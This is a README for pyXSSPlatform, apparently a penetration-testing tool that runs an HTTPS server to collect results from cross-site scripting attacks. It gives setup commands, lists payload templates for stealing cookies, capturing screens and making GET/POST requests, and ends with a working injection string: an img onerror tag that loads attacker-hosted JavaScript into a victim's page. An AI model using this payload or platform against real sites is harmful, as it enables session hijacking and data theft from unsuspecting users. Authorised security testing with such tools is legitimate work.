# pyXSSPlatform
Used to build an XSS platform on the command line.

Usage:

1.generate the cert file

You can use openssl like this:

`openssl req -new -x509 -keyout https_svr_key.pem -out https_svr_key.pem -days 3650 -nodes`

2.add your js code to index.js

You can refer to the files in Payload_Template folder

Payload:

- GetCookie
- CaptureScreen
- GET/POST

3.start the HTTPS server

`pyXSSPlatform.py <listen address> <listen port> <cert file>`

Eg.

`pyXSSPlatform.py 0.0.0.0 443 https_svr_key.pem`

Finally, you can try the following pyaload :

`<img src=x onerror=with(document)body.appendChild(document.createElement('script')).src="https://<your XSSPlatform ip>/index.js"></img>`

[渗透工具开发——XSS平台的命令行实现](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91-XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%9E%E7%8E%B0)

